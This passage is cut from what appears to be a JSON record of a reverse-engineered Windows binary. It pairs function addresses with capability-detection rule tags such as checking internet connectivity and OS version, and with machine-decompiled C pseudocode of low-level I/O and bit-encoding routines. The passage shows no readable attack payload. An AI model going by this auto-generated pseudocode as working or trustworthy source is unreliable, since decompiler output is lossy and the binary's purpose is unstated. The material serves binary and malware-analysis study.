       var_18h = 0x2159000a;\n            }\n            else {\n                var_2h._0_1_ = *var_10h;\n                if (var_14h < var_2h + 1) {\n                    var_18h = 0x2159000a;\n                }\n                else {\n                    *arg_14h = var_10h + var_2h + 1;\n                    *arg_18h = var_14h - (var_2h + 1);\n                    var_2h._1_1_ = var_2h;\n                    if (0x90 < var_2h) {\n                        var_2h._1_1_ = 0x90;\n                    }\n                    fcn.0007877e(arg_1ch, var_10h + 1, var_2h._1_1_);\n                    fcn.00078790(var_2h._1_1_ + arg_1ch, 0, 0x90 - var_2h._1_1_);\n                    if (*arg_18h == 0) {\n                        *arg_14h = NULL;\n                    }\n                    else {\n                        var_10h[var_2h] = var_2h;\n                        var_10h = NULL;\n                    }\n                }\n            }\n        }\n        else if ((var_18h != 0x21590002) && (fcn.00075d60(arg_8h + 8, 0),  *(arg_8h + 0xc) == 0)) {\n            *(arg_8h + 0x10) = 0;\n        }\n    }\ncode_r0x00067434:\n    if (var_18h != 0) {\n        fcn.00076610(*(arg_8h + 8), var_10h);\n        fcn.00075d60(arg_8h + 8, 0);\n        if (*(arg_8h + 0xc) == 0) {\n            *(arg_8h + 0x10) = 0;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 1397
    },
    "00067480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00067480(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_ch_00 = (arg_ch + -1) - *(arg_ch + -1);\n    if (*(arg_8h + 8) == 0) {\n        fcn.00076610(*(arg_8h + 4), arg_ch_00);\n    }\n    else {\n        fcn.00076610(*(arg_8h + 8), arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00067500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00067500(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.000675d0(arg_8h, 0x138, arg_ch, arg_10h, arg_14h, 0, 0, arg_18h);\n    if ((iVar1 == 0) && (iVar1 = fcn.00068000(*arg_8h, 1),  iVar1 != 0)) {\n        fcn.00067800(*arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 160
    },
    "00067560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00067560(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.000675d0(arg_8h, 0x144, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    if (iVar1 == 0) {\n        *(*arg_8h + 4) = 1;\n        iVar1 = fcn.00068000(*arg_8h, 1);\n        if (iVar1 != 0) {\n            fcn.00067800(*arg_8h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 196
    },
    "000675d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.000675d0(int32_t *arg_8h, uint arg_ch, char *arg_10h, int32_t arg_14h, uint noname_4, int32_t arg_1ch, uint noname_6\n            , uint32_t arg_24h)\n\n{\n    int16_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_18h;\n    int16_t *var_14h;\n    int16_t *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035230(arg_ch);\n    if (arg_8h_00 == 0) {\n        var_ch = 0x21590004;\n    }\n    else {\n        fcn.00078790(arg_8h_00, 0, arg_ch);\n        *(arg_8h_00 + 0x11c) = 0xffff;\n        if ((arg_10h == NULL) || (*arg_10h == '\\0')) {\n            var_10h = 0xb1be2878;\n            var_14h = arg_8h_00 + 0x12;\n            do {\n                iVar1 = *var_10h;\n                *var_14h = iVar1;\n                var_10h = var_10h + 1;\n                var_14h = var_14h + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            iVar2 = fcn.00078556(arg_8h_00 + 0x12, 0x40, 0xb1be1684, arg_10h);\n            if (iVar2 < 0) {\n                *(arg_8h_00 + 0x90) = 0;\n            }\n        }\n        if (arg_14h == 0) {\n            fcn.00078060(arg_8h_00 + 0xd8, arg_8h_00 + 0x118);\n        }\n        else {\n            var_ch = fcn.00077f20(arg_14h, (arg_24h & 1) != 0, arg_8h_00 + 0xd8, arg_8h_00 + 0x118);\n            if (var_ch != 0) goto code_r0x00067785;\n        }\n        iVar2 = fcn.000783a0(arg_8h_00 + 0x12, arg_8h_00 + 0xd8, *(arg_8h_00 + 0x118), arg_8h_00 + 8, arg_8h_00 + 0xc);\n        if (iVar2 == 0) {\n            if ((arg_1ch == 0) ||\n               (var_ch = fcn.00077f20(arg_1ch, (arg_24h & 2) != 0, arg_8h_00 + 0x92, arg_8h_00 + 0xd4),  var_ch == 0)) {\n                fcn.000735b0(arg_8h_00 + 0x120);\n                var_ch = 0;\n                *arg_8h = arg_8h_00;\n            }\n        }\n        else {\n            var_ch = fcn.000785b6(iVar2);\n        }\n    }\ncode_r0x00067785:\n    if ((var_ch != 0) && (arg_8h_00 != 0)) {\n        if (*(arg_8h_00 + 8) != 0) {\n            fcn.00078544(*(arg_8h_00 + 8));\n        }\n        fcn.00035330(arg_8h_00);\n    }\n    return var_ch;\n}\n",
        "token_count": 855
    },
    "000677c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000677c0(int32_t arg_8h)\n\n{\n    fcn.00068000(arg_8h, 0);\n    *(arg_8h + 0x10) = 1;\n    while (0 < *(arg_8h + 0x134)) {\n        fcn.000340b0(arg_8h + 300);\n        fcn.000209a0(0);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "00067800": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067800(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 8) != 0) {\n        fcn.00078544(*(arg_8h + 8));\n    }\n    fcn.000735f0(arg_8h + 0x120, 1);\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 90
    },
    "00067840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00067840(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_88h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    do {\n        do {\n            while( true ) {\n                iVar1 = fcn.00077cd0(&var_4h, &var_88h, 0x80, &var_8h);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                iVar1 = fcn.0007861c(&var_88h, 0xb1be2854);\n                if ((iVar1 != 0) || (*(arg_8h + 4) == '\\0')) break;\n                uVar2 = fcn.00037500(var_8h, arg_8h + 0x138);\n                *(arg_8h + 0x140) = uVar2;\n            }\n            iVar1 = fcn.0007861c(&var_88h, 0xb1be2890);\n        } while (iVar1 != 0);\n        uVar2 = fcn.00035eb0(var_8h, 0, 0);\n        *(arg_8h + 0x11c) = uVar2;\n    } while (*(arg_8h + 0x11c) != 0);\n    return 0x21590066;\n}\n",
        "token_count": 330
    },
    "000679c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000679c0(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(arg_8h + 0x140) == 0) || ((arg_10h & 0x10000) != 0)) {\n        var_4h = fcn.00067a50(arg_8h, arg_ch);\n    }\n    else {\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        if (*(arg_8h + 0x140) != 0) {\n            fcn.00037560(arg_8h + 0x138, &var_14h);\n        }\n        var_14h = arg_ch;\n        var_4h = fcn.00067a50(arg_8h, &var_14h);\n        fcn.00035330(var_10h);\n    }\n    return var_4h;\n}\n",
        "token_count": 260
    },
    "00067ab0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00067cd7)\n// WARNING: Removing unreachable block (ram,0x00067ccc)\n// WARNING: Removing unreachable block (ram,0x00067cee)\n// WARNING: Removing unreachable block (ram,0x00067c33)\n// WARNING: Removing unreachable block (ram,0x00067c63)\n// WARNING: Removing unreachable block (ram,0x00067c6a)\n// WARNING: Removing unreachable block (ram,0x00067c73)\n// WARNING: Removing unreachable block (ram,0x00067c86)\n// WARNING: Removing unreachable block (ram,0x00067c8f)\n// WARNING: Removing unreachable block (ram,0x00067c9f)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00067ab0(int32_t param_1, uint *param_2, int32_t param_3)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    uint *var_ch;\n    int32_t var_10h;\n    uint var_18h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint *var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    ushort var_58h;\n    uint var_56h;\n    uint var_52h;\n    uint var_4eh;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c457a8;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffff70;\n    arg_ch = *(*(var_8h + 0xc) + 4);\n    var_48h = (**0xb1bde230)(3, arg_ch, 0, 0, 0, 0, 1, 0, 0);\n    if (var_48h == 0) {\n        var_64h = 0x21590004;\n    }\n    else {\n        var_28h = 0;\n        for (var_68h = var_ch; var_68h != NULL; var_68h = *var_68h) {\n            if (var_68h[2] != 0) {\n                var_44h = (**0xb1bde294)(var_68h[1], var_68h[2], var_68h != var_ch, 0, var_48h);\n                if (var_44h == 0) {\n                    (**0xb1bde2ec)();\n                    var_64h = 0x21590004;\n                    goto code_r0x00067d87;\n                }\n                var_4h = 0;\n                (**0xb1bde2a0)(var_44h, 0, 0);\n                var_4h = 0xffffffff;\n                var_28h = var_28h + var_68h[2];\n            }\n        }\n        var_60h = 1;\n        var_5ch._0_2_ = 0xe;\n        var_5ch._2_2_ = 2;\n        var_56h = *(var_10h + 4);\n        var_58h = *(var_10h + 2);\n        var_52h = 0;\n        var_4eh = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        var_38h = 0;\n        var_34h = 0;\n        var_2ch = &var_60h;\n        var_30h = 0x16;\n        iVar1 = *(var_48h + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(var_48h + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 9;\n        *(iVar1 + -0x10) = arg_ch;\n        *(iVar1 + -0xc) = *(var_8h + 0xc);\n        *(iVar1 + -0x20) = var_28h;\n        *(iVar1 + -0x1c) = &var_40h;\n        *(var_48h + 4) = *(var_48h + 4);\n        var_24h = fcn.00078160(var_48h, arg_ch, &var_20h, 0xffffffff);\n        var_64h = fcn.000785b6(var_24h);\n        if (var_24h == -0x3ffffdfa) {\n            var_64h = 0x2159000b;\n        }\n    }\ncode_r0x00067d87:\n    *in_FS_OFFSET = var_10h_2;\n    return var_64h;\n}\n",
        "token_count": 1281
    },
    "00067da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00067da0(int32_t arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    do {\n        if (*(arg_8h + 0x10) != '\\0') {\n            return 0x21590006;\n        }\n        iVar1 = fcn.00073770(&var_ch, &var_8h, arg_8h + 0x120, arg_14h);\n        if (iVar1 == 0) {\n            *arg_ch = var_ch;\n            *arg_10h = var_8h;\n            return 0;\n        }\n        fcn.000569a0(arg_8h + 0x134);\n        var_4h = fcn.000340e0(arg_8h + 300, arg_18h);\n        var_ch = arg_8h + 0x134;\n        fcn.000674e0(var_ch);\n        if (var_4h == 0) {\n            return 0x21590002;\n        }\n    } while (var_4h != -1);\n    return 0xffffffff;\n}\n",
        "token_count": 306
    },
    "00067e90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00067e90(int32_t arg_8h, int32_t arg_ch, char **arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint uVar3;\n    uint32_t in_EDX;\n    uint var_48h;\n    char **var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    if ((arg_ch == 4) || (arg_ch == 3)) {\n        uVar2 = fcn.000354c0(in_EDX & 0xffff0000 | *(arg_8h + 0x9a));\n        fcn.0007865e(&var_18h, 0xb1be2868, *(arg_8h + 0x9c), *(arg_8h + 0x9d), *(arg_8h + 0x9e), *(arg_8h + 0x9f), uVar2\n                    );\n        if (arg_ch == 3) {\n            if (arg_14h != 0x4) {\n                return 0x21590064;\n            }\n            var_20h = &var_18h;\n            do {\n                cVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (cVar1 != '\\0');\n            *arg_10h = var_20h + (1 - (&var_18h + 1));\n        }\n        else {\n            if (arg_14h < 1) {\n                return 0x21590064;\n            }\n            var_30h = &var_18h;\n            do {\n                cVar1 = *var_30h;\n                var_30h = var_30h + 1;\n            } while (cVar1 != '\\0');\n            if (arg_14h < var_30h + (1 - (&var_18h + 1))) {\n                fcn.00078652(arg_10h, &var_18h, arg_14h + -1);\n                *(arg_10h + arg_14h + -1) = '\\0';\n            }\n            else {\n                var_40h = &var_18h;\n                var_44h = arg_10h;\n                do {\n                    cVar1 = *var_40h;\n                    *var_44h = cVar1;\n                    var_40h = var_40h + 1;\n                    var_44h = var_44h + 1;\n                } while (cVar1 != '\\0');\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x21590001;\n    }\n    return uVar3;\n}\n",
        "token_count": 666
    },
    "00068000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000680ed)\n// WARNING: Removing unreachable block (ram,0x000680e2)\n// WARNING: Removing unreachable block (ram,0x00068104)\n// WARNING: Removing unreachable block (ram,0x00068049)\n// WARNING: Removing unreachable block (ram,0x00068079)\n// WARNING: Removing unreachable block (ram,0x00068080)\n// WARNING: Removing unreachable block (ram,0x00068089)\n// WARNING: Removing unreachable block (ram,0x0006809c)\n// WARNING: Removing unreachable block (ram,0x000680a5)\n// WARNING: Removing unreachable block (ram,0x000680b5)\n\nuint __cdecl fcn.00068000(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    uVar2 = *(*(arg_8h + 0xc) + 4);\n    arg_8h_00 = (**0xb1bde230)(3, *(*(arg_8h + 0xc) + 4), 0, 0, 0, 0, 1, 0, 0);\n    if (arg_8h_00 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        iVar1 = *(arg_8h_00 + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(arg_8h_00 + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 0xb;\n        *(iVar1 + -0x10) = uVar2;\n        *(iVar1 + -0xc) = *(arg_8h + 0xc);\n        *(iVar1 + -0x20) = 4;\n        *(iVar1 + -0x1c) = -(arg_ch != '\\0') & 0xb1c35190;\n        *(iVar1 + -0x18) = arg_8h;\n        uVar2 = fcn.00078160(arg_8h_00, uVar2, &var_8h, 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 590
    },
    "00068190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000684f9)\n// WARNING: Removing unreachable block (ram,0x000684c3)\n// WARNING: Removing unreachable block (ram,0x000684ee)\n// WARNING: Removing unreachable block (ram,0x000684f5)\n// WARNING: Removing unreachable block (ram,0x0006850c)\n// WARNING: Removing unreachable block (ram,0x00068510)\n\nint32_t __cdecl\nfcn.00068190(uint32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint noname_3, uint noname_4, uint32_t arg_1ch, \n            uint arg_20h, int32_t arg_24h, uint *arg_28h, uint arg_2ch, int32_t *arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_20h = 0;\n    var_1ch = NULL;\n    uVar4 = *(arg_8h + 0x128) + arg_24h;\n    if (*(arg_8h + 0x11c) <= uVar4 && uVar4 != *(arg_8h + 0x11c)) {\n        return -0x3ffffde5;\n    }\n    fcn.00077ff0(arg_10h, &var_10h);\n    if (*(arg_8h + 4) == '\\0') goto code_r0x000682e4;\n    var_40h = arg_8h + 0x92;\n    var_44h = arg_10h;\n    for (var_3ch = arg_ch; 3 < var_3ch; var_3ch = var_3ch - 4) {\n        if (*var_44h != *var_40h) goto code_r0x0006822f;\n        var_40h = var_40h + 1;\n        var_44h = var_44h + 1;\n    }\n    if (var_3ch == 0) {\ncode_r0x000682b1:\n        var_4ch = 0;\n    }\n    else {\ncode_r0x0006822f:\n        var_48h = *var_44h - *var_40h;\n        if (var_48h == 0) {\n            if (var_3ch == 1) goto code_r0x000682b1;\n            var_48h = *(var_44h + 1) - *(var_40h + 1);\n            if (var_48h == 0) {\n                if (var_3ch == 2) goto code_r0x000682b1;\n                var_48h = *(var_44h + 2) - *(var_40h + 2);\n                if (var_48h == 0) {\n                    if ((var_3ch == 3) || (var_48h = *(var_44h + 3) - *(var_40h + 3),  var_48h == 0))\n                    goto code_r0x000682b1;\n                }\n            }\n        }\n        var_4ch = 1;\n        if (var_48h < 1) {\n            var_4ch = -1;\n        }\n    }\n    if (var_4ch != 0) {\n        return -0x3ffffde5;\n    }\ncode_r0x000682e4:\n    if ((arg_1ch & 0x400) == 0) {\n        var_14h = (**0xb1bde270)(arg_8h & 0xffffff00 | *(*(*(arg_8h + 0xc) + 4) + 0x30), 0);\n        if (var_14h == 0) {\n            var_28h = -0x3fffff66;\n        }\n        else {\n            var_1ch = fcn.00035230(0x70);\n            if (var_1ch == NULL) {\n                var_28h = -0x3fffff66;\n            }\n            else {\n                uVar3 = fcn.00035230(arg_24h);\n                var_1ch[5] = uVar3;\n                if (var_1ch[5] == 0) {\n                    var_28h = -0x3fffff66;\n                }\n                else {\n                    var_20h = (**0xb1bde294)(var_1ch[5], arg_24h, 0, 0, var_14h);\n                    if (var_20h == 0) {\n                        var_28h = -0x3fffff66;\n                    }\n                    else {\n                        (**0xb1bde268)(var_20h);\n                        var_1ch[4] = arg_8h;\n                        *var_1ch = var_10h;\n                        var_1ch[1] = var_ch;\n                        var_1ch[2] = var_8h;\n                        var_1ch[3] = var_4h;\n                        var_1ch[6] = 0;\n                        var_1ch[7] = 0;\n                        var_1ch[8] = 0;\n                        var_1ch[9] = 0;\n                        var_1ch[10] = 0;\n                        var_1ch[0xb] = 0;\n                        var_1ch[0xb] = var_1ch + 0xc;\n                        var_1ch[10] = 0x40;\n                        iVar1 = *(var_14h + 0x60);\n                        *(iVar1 + -8) = 0xb1c35640;\n                        *(iVar1 + -4) = var_1ch;\n                        *(iVar1 + -0x21) = 0;\n                        *(iVar1 + -0x21) = 0x40;\n                        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x80;\n                        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x20;\n                        iVar1 = *(var_14h + 0x60);\n                        *(iVar1 + -0x24) = 0xf;\n                        *(iVar1 + -0x23) = 10;\n                        *(iVar1 + -0x10) = *(*(arg_8h + 0xc) + 4);\n                        *(iVar1 + -0xc) = *(arg_8h + 0xc);\n                        *(iVar1 + -0x20) = arg_24h;\n                        *(iVar1 + -0x1c) = 0;\n                        *(iVar1 + -0x18) = var_1ch + 6;\n                        *(iVar1 + -0x14) = 0x20;\n                        *(var_14h + 4) = var_20h;\n                        *(var_14h + 0x23) = *(var_14h + 0x23) + -1;\n                        *(var_14h + 0x60) = *(var_14h + 0x60) + -0x24;\n                        *arg_30h = var_14h;\n                        *arg_28h = 0;\n                        var_28h = -0x3fffffea;\n                        var_14h = 0;\n                        var_20h = 0;\n                        var_1ch = NULL;\n                    }\n                }\n            }\n        }\n        if (var_1ch != NULL) {\n            fcn.00035330(var_1ch[5]);\n            fcn.00035330(var_1ch);\n        }\n        if (var_20h != 0) {\n            (**0xb1bde2ac)(var_20h);\n        }\n        if (var_14h != 0) {\n            (**0xb1bde26c)(var_14h);\n        }\n        if (var_28h != -0x3fffffea) {\n            var_28h = -0x3ffffde5;\n        }\n    }\n    else {\n        iVar1 = fcn.00035230(arg_20h);\n        if (iVar1 != 0) {\n            fcn.0007877e(iVar1, arg_2ch, arg_20h);\n            iVar2 = fcn.00073680(iVar1, arg_20h, arg_8h + 0x120, &var_10h);\n            if (iVar2 == 0) {\n                *arg_28h = arg_20h;\n                return 0;\n            }\n            fcn.00035330(iVar1);\n        }\n        var_28h = -0x3ffffde5;\n    }\n    return var_28h;\n}\n",
        "token_count": 2109
    },
    "00068640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00068640(uint noname_0, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*(arg_ch + 0x18) == 0) {\n        iVar1 = fcn.00073680(*(arg_10h + 0x14), *(arg_ch + 0x1c), *(arg_10h + 0x10) + 0x120, arg_10h);\n        if (iVar1 == 0) {\n            *(arg_10h + 0x14) = 0;\n        }\n    }\n    if (*(arg_10h + 0x14) != 0) {\n        fcn.00035330(*(arg_10h + 0x14));\n    }\n    fcn.00035330(arg_10h);\n    (**0xb1bde2ac)(*(arg_ch + 4));\n    (**0xb1bde26c)(arg_ch);\n    return 0xc0000016;\n}\n",
        "token_count": 235
    },
    "000686d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000686d0(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_ch = 0;\n    *arg_10h = 0;\n    for (var_14h = 0; var_14h < arg_ch; var_14h = var_14h + 1) {\n        iVar1 = fcn.000785ce(0xb1bdea7c, *(arg_8h + var_14h));\n        if (iVar1 != 0) {\n            var_5h = iVar1 + 0x84;\n            if (0x1f < var_5h) {\n                var_5h = 0x1f;\n            }\n            for (var_10h = 0; var_10h < 5; var_10h = var_10h + 1) {\n                arg_10h[var_18h] =\n                     arg_10h[var_18h] | ((var_5h & 1 << (var_10h & 0x1f)) >> (var_10h & 0x1f)) << (var_ch & 0x1f);\n                var_ch = var_ch + 1;\n                if ((7 < var_ch) && (var_ch = 0,  var_14h < arg_ch + -1)) {\n                    var_18h = var_18h + 1;\n                    arg_10h[var_18h] = 0;\n                }\n            }\n        }\n    }\n    return var_18h + 1;\n}\n",
        "token_count": 420
    },
    "000687d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000687d0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    for (var_4h = 0; var_4h < arg_ch << 3; var_4h = var_4h + 1) {\n        var_8h = ((*(arg_8h + (var_4h >> 3)) & 1 << var_4h % 8) >> var_4h % 8) << var_4h % 0x1c | var_8h;\n        if (var_4h % 0x1c == 0x1b) {\n            *(arg_10h + var_ch * 4) = var_ch << 0x1c | var_8h;\n            var_ch = var_ch + 1;\n            var_8h = 0;\n        }\n    }\n    if (var_4h % 0x1c != 0x1b) {\n        for (; var_4h % 0x1c != 0x1b; var_4h = var_4h + 1) {\n            uVar1 = fcn.000785f8();\n            uVar1 = uVar1 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 1) {\n                var_8h = 1 << var_4h % 0x1c | var_8h;\n            }\n        }\n        *(arg_10h + var_ch * 4) = var_ch << 0x1c | var_8h;\n        var_ch = var_ch + 1;\n    }\n    return var_ch;\n}\n",
        "token_count": 459
    },
    "00068910": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
